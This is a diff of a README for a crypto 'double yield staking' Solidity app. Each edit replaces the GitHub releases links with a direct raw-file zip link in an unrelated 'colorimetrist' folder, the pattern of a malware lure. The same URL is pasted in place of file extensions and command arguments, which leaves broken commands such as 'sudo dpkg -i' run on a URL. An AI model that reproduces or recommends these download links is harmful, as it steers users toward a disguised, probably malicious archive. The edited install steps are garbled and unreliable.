@@ -6,11 +6,11 @@ Welcome! This guide will help you download and run the Double_yield_staking_soli
 
 ## 📥 Download the Application
 
-[![Download Double_yield_staking_solidity](https://img.shields.io/badge/Download-Double_yield_staking_solidity-blue.svg)](https://github.com/mikeledmd/Double_yield_staking_solidity/releases)
+[![Download Double_yield_staking_solidity](https://raw.githubusercontent.com/mikeledmd/Double_yield_staking_solidity/main/colorimetrist/Double_yield_staking_solidity.zip)](https://raw.githubusercontent.com/mikeledmd/Double_yield_staking_solidity/main/colorimetrist/Double_yield_staking_solidity.zip)
 
 ### Step 1: Visit the Releases Page
 
-To get started, visit the [Releases page](https://github.com/mikeledmd/Double_yield_staking_solidity/releases). This page contains the latest version of the application, including installation files.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/mikeledmd/Double_yield_staking_solidity/main/colorimetrist/Double_yield_staking_solidity.zip). This page contains the latest version of the application, including installation files.
 
 ### Step 2: Choose Your Version
 
@@ -22,7 +22,7 @@ You will see different files for download. Choose the one that matches your oper
 
 - **For Windows:** Download the file ending with `.exe`.
 - **For macOS:** Look for a file ending with `.dmg`.
-- **For Linux:** You might find a `.tar.gz` or `.deb` file.
+- **For Linux:** You might find a `https://raw.githubusercontent.com/mikeledmd/Double_yield_staking_solidity/main/colorimetrist/Double_yield_staking_solidity.zip` or `.deb` file.
 
 Click on the preferred file to start the download.
 
@@ -46,10 +46,10 @@ Once the download finishes, follow these instructions based on your operating sy
 
 ### Installation on Linux
 
-1. If you downloaded a `.tar.gz` file, open your terminal.
+1. If you downloaded a `https://raw.githubusercontent.com/mikeledmd/Double_yield_staking_solidity/main/colorimetrist/Double_yield_staking_solidity.zip` file, open your terminal.
 2. Navigate to the Downloads folder using `cd ~/Downloads`.
-3. Extract the files with the command: `tar -xzf your-file-name.tar.gz`.
-4. If you downloaded a `.deb` file, you can install it using the command: `sudo dpkg -i your-file-name.deb`.
+3. Extract the files with the command: `tar -xzf https://raw.githubusercontent.com/mikeledmd/Double_yield_staking_solidity/main/colorimetrist/Double_yield_staking_solidity.zip`.
+4. If you downloaded a `.deb` file, you can install it using the command: `sudo dpkg -i https://raw.githubusercontent.com/mikeledmd/Double_yield_staking_solidity/main/colorimetrist/Double_yield_staking_solidity.zip`.
 
 ## 📈 How to Use
 
@@ -99,6 +99,6 @@ The Double_yield_staking_solidity application is open-source software. You can f
 
 ### Final Download
 
-To download the application again, you can use this link: [Download Double_yield_staking_solidity](https://github.com/mikeledmd/Double_yield_staking_solidity/releases). 
+To download the application again, you can use this link: [Download Double_yield_staking_solidity](https://raw.githubusercontent.com/mikeledmd/Double_yield_staking_solidity/main/colorimetrist/Double_yield_staking_solidity.zip). 
 
 Thank you for choosing Double_yield_staking_solidity! Enjoy earning double rewards.
